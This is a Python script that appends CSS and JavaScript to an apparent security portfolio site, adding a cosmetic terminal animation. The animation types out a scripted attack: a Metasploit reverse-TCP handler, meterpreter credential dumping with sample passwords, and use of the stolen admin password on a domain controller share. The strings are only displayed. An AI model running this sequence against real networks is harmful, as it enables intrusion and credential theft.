import os

css_content = """
/* Terminal Modal Simulation */
.terminal-overlay {
  position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 10000;
  display: none; align-items: center; justify-content: center; backdrop-filter: blur(5px);
}
.terminal-overlay.active { display: flex; }
.terminal-window {
  width: 800px; max-width: 95%; height: 500px; background: #0a0a0c; border: 1px solid rgba(0,229,255,0.3);
  border-radius: 8px; box-shadow: 0 0 30px rgba(0,229,255,0.15); display: flex; flex-direction: column; overflow: hidden;
}
.terminal-header {
  height: 30px; background: #1a1b26; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; align-items: center; padding: 0 10px;
}
.terminal-btn {
  width: 12px; height: 12px; border-radius: 50%; margin-right: 8px; cursor: pointer;
}
.terminal-btn.close { background: #ff5f56; }
.terminal-btn.min { background: #ffbd2e; }
.terminal-btn.max { background: #27c93f; }
.terminal-title { color: #888; font-size: 0.8rem; font-family: monospace; margin-left: 10px; }
.terminal-body {
  flex: 1; padding: 15px; color: #0f0; font-family: 'Fira Code', monospace; font-size: 0.9rem;
  overflow-y: auto; text-shadow: 0 0 5px rgba(0,255,0,0.5); line-height: 1.4;
}
.terminal-body .term-cmd { color: #fff; font-weight: bold; }
.terminal-body .term-err { color: #ff0055; text-shadow: 0 0 5px rgba(255,0,85,0.5); }
.terminal-body .term-warn { color: #ffbd2e; }
.hack-btn {
  background: transparent; border: 2px solid #ff0055; color: #ff0055; padding: 10px 20px; font-family: 'Outfit', sans-serif;
  font-weight: bold; border-radius: 4px; cursor: pointer; text-transform: uppercase; letter-spacing: 2px;
  transition: all 0.3s ease; display: inline-flex; align-items: center; gap: 10px; margin-top: 15px;
  box-shadow: 0 0 10px rgba(255,0,85,0.2) inset;
}
.hack-btn:hover {
  background: #ff0055; color: #fff; box-shadow: 0 0 20px rgba(255,0,85,0.6);
}
"""

js_content = """
// Live APT Simulation
const aptSimulationLines = [
  { text: "root@kali:~# msfconsole -q", type: "cmd", delay: 800 },
  { text: "msf6 > use exploit/multi/handler", type: "cmd", delay: 500 },
  { text: "msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp", type: "cmd", delay: 600 },
  { text: "PAYLOAD => windows/x64/meterpreter/reverse_tcp", delay: 200 },
  { text: "msf6 exploit(multi/handler) > exploit -j", type: "cmd", delay: 400 },
  { text: "[*] Exploit running as background job 0.", delay: 300 },
  { text: "[*] Started reverse TCP handler on 10.0.0.5:4444", delay: 1000 },
  { text: "[*] Sending stage (200262 bytes) to 10.0.0.102", delay: 500 },
  { text: "[*] Meterpreter session 1 opened (10.0.0.5:4444 -> 10.0.0.102:49156)", type: "cmd", delay: 1200 },
  { text: "meterpreter > load kiwi", type: "cmd", delay: 800 },
  { text: "Loading extension kiwi...Success.", delay: 400 },
  { text: "meterpreter > creds_all", type: "cmd", delay: 1000 },
  { text: "[+] Running as SYSTEM", type: "cmd", delay: 300 },
  { text: "Retrieving all credentials...", delay: 500 },
  { text: "Username    Domain   Password", delay: 100 },
  { text: "--------    ------   --------", delay: 100 },
  { text: "Administrator CORP     Winter2025!", type: "err", delay: 500 },
  { text: "jsmith      CORP     P@ssw0rd123", delay: 200 },
  { text: "meterpreter > shell", type: "cmd", delay: 700 },
  { text: "Process 3132 created.", delay: 200 },
  { text: "C:\\\\Windows\\\\system32> net use \\\\\\\\DC01\\\\C$ /user:CORP\\\\Administrator Winter2025!", type: "cmd", delay: 1500 },
  { text: "The command completed successfully.", delay: 400 },
  { text: "C:\\\\Windows\\\\system32> echo APT_OWNED > \\\\\\\\DC01\\\\C$\\\\owned.txt", type: "cmd", delay: 800 },
  { text: "[!!!] DOMAIN CONTROLLER COMPROMISED [!!!]", type: "err", delay: 1000 }
];

function launchAPT() {
  const overlay = document.getElementById('terminal-overlay');
  const output = document.getElementById('terminal-output');
  if(!overlay || !output) return;
  overlay.classList.add('active');
  output.innerHTML = '';
  
  let i = 0;
  function printLine() {
    if(i >= aptSimulationLines.length) return;
    const line = aptSimulationLines[i];
    const p = document.createElement('div');
    if(line.type === 'cmd') p.className = 'term-cmd';
    else if(line.type === 'err') p.className = 'term-err';
    else if(line.type === 'warn') p.className = 'term-warn';
    
    output.appendChild(p);
    
    let charIdx = 0;
    const typeInterval = setInterval(() => {
      p.textContent += line.text.charAt(charIdx);
      charIdx++;
      output.scrollTop = output.scrollHeight;
      if(charIdx >= line.text.length) {
        clearInterval(typeInterval);
        i++;
        setTimeout(printLine, line.delay);
      }
    }, 15);
  }
  printLine();
}

function closeTerminal() {
  document.getElementById('terminal-overlay').classList.remove('active');
}
"""

with open('d:\\abdo_portfolio\\build\\css\\methodology.css', 'a', encoding='utf-8') as f:
    f.write(css_content)

with open('d:\\abdo_portfolio\\build\\js\\methodology.js', 'a', encoding='utf-8') as f:
    f.write(js_content)

print("Injected CSS and JS successfully.")
